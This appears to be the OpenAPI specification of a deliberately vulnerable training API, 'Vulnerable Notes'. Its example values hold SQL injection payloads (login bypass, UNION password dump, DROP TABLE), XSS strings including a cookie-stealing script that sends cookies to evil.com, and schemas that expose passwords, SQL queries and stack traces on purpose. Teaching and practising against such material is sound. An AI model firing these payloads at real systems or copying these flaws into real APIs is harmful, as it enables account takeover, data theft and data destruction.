# openapi.yaml
openapi: 3.0.3
info:
  title: Vulnerable Notes API
  description: |
    **⚠️ WARNING: This API is intentionally vulnerable for educational purposes!**
    
    This API demonstrates various security vulnerabilities commonly found in web applications:
    - SQL Injection
    - Cross-Site Scripting (XSS) 
    - Broken Authentication & Authorization
    - Sensitive Data Exposure
    - Security Misconfiguration
    - Insecure Direct Object References
    
    **DO NOT USE IN PRODUCTION!**
  version: 1.0.0
  contact:
    name: Security Education Project
    email: security@vulnerable-app.com
  license:
    name: MIT
    url: https://opensource.org/licenses/MIT
servers:
  - url: http://localhost:3000/api
    description: Development server (vulnerable)
  - url: https://vulnerable-notes.vercel.app/api
    description: Production server (also vulnerable!)
paths:
  /auth/login:
    post:
      summary: Login user (vulnerable to brute force)
      description: |
        **VULNERABILITIES:**
        - No rate limiting (brute force attacks)
        - Detailed error messages help attackers
        - Password in response
        - Insecure cookie settings
        - No CSRF protection
      tags:
        - Authentication
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                email:
                  type: string
                  format: email
                  example: admin@vulnerable-app.com
                password:
                  type: string
                  example: admin123
              required:
                - email
                - password
            examples:
              normalLogin:
                summary: Normal login
                value:
                  email: user@example.com
                  password: password123
              sqlInjection:
                summary: SQL Injection attempt
                value:
                  email: "admin' OR '1'='1' --"
                  password: anything
      responses:
        '200':
          description: Login successful
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/LoginResponse'
        '401':
          description: Login failed
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
...
  /lab/sqli:
    get:
      summary: SQL Injection demonstration (lab mode only)
      description: |
        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
        
        This endpoint demonstrates SQL injection vulnerabilities.
        Only available when LAB_MODE=true.
      tags:
        - Lab (Educational)
      parameters:
        - name: search
          in: query
          schema:
            type: string
          description: Search parameter vulnerable to SQL injection
          examples:
            bypass:
              summary: Authentication bypass
              value: "admin' OR '1'='1"
            union:
              summary: Union attack
              value: "' UNION SELECT password FROM users --"
            drop:
              summary: Destructive attack
              value: "'; DROP TABLE users; --"
      responses:
        '200':
          description: Vulnerability demonstration results
  /lab/xss:
    get:
      summary: XSS demonstration (lab mode only)
      description: |
        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
        
        This endpoint demonstrates XSS vulnerabilities.
        Only available when LAB_MODE=true.
      tags:
        - Lab (Educational)
      parameters:
        - name: input
          in: query
          schema:
            type: string
          description: Input reflected without escaping
          examples:
            alert:
              summary: Basic XSS
              value: "<script>alert('XSS')</script>"
            img:
              summary: Image XSS
              value: "<img src=x onerror=alert('XSS')>"
            cookie:
              summary: Cookie stealing
              value: "<script>document.location='//evil.com?cookie='+document.cookie</script>"
        - name: reflect
          in: query
          schema:
            type: boolean
          description: Whether to reflect the input
      responses:
        '200':
          description: HTML page with reflected XSS vulnerability
  /lab/csp:
    get:
      summary: CSP demonstration (lab mode only)
      description: |
        **EDUCATIONAL VULNERABILITY DEMONSTRATION**
        
        This endpoint demonstrates Content Security Policy vulnerabilities.
        Only available when LAB_MODE=true.
      tags:
        - Lab (Educational)
      parameters:
        - name: mode
          in: query
          schema:
            type: string
            enum: [none, weak, strong]
          description: CSP configuration to demonstrate
      responses:
        '200':
          description: HTML page demonstrating CSP effectiveness
components:
  schemas:
    User:
      type: object
      properties:
        id:
          type: string
        email:
          type: string
          format: email
        password:
          type: string
          description: "VULNERABLE: Password exposed in API responses!"
        role:
          type: string
          enum: [user, admin]
        isAdmin:
          type: boolean
        createdAt:
          type: string
          format: date-time
        updatedAt:
          type: string
          format: date-time
...
    ApiResponse:
      type: object
      properties:
        success:
          type: boolean
        data:
          type: object
        error:
          type: string
        debug:
          type: object
          description: "VULNERABLE: Debug info exposed in production"
          properties:
            query:
              type: string
              description: "SQL queries exposed"
            params:
              type: object
              description: "Request parameters logged"
            stack:
              type: string
              description: "Stack traces exposed"
            timestamp:
              type: string
    LoginResponse:
      allOf:
        - $ref: '#/components/schemas/ApiResponse'
        - type: object
          properties:
            data:
              type: object
              properties:
                user:
                  $ref: '#/components/schemas/User'
                token:
                  type: string
                  description: "JWT token with sensitive data"
...
    ErrorResponse:
      allOf:
        - $ref: '#/components/schemas/ApiResponse'
        - type: object
          properties:
            success:
              example: false
            error:
              type: string
              example: "Detailed error message that helps attackers"
...